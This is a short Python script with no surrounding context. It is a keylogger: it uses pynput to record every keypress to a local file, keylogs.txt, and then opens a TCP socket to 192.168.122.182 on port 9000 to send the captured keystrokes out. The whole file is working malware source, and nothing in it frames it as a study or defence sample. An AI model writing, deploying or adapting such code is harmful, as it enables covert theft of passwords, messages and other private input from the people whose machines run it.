import socket
from pynput import keyboard
import os
import fcntl

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as file:
            fcntl.flock(file, fcntl.LOCK_EX)
            file.write(str(key))
            fcntl.flock(file, fcntl.LOCK_UN)
    except Exception as e:
        print(e)

def transmit_logs():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('192.168.122.182', 9000))
            with open('keylogs.txt', 'rb') as file:
                fcntl.flock(file, fcntl.LOCK_EX)
                s.sendall(file.read())
                fcntl.flock(file, fcntl.LOCK_UN)
    except Exception as e:
        print(e)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

transmit_logs()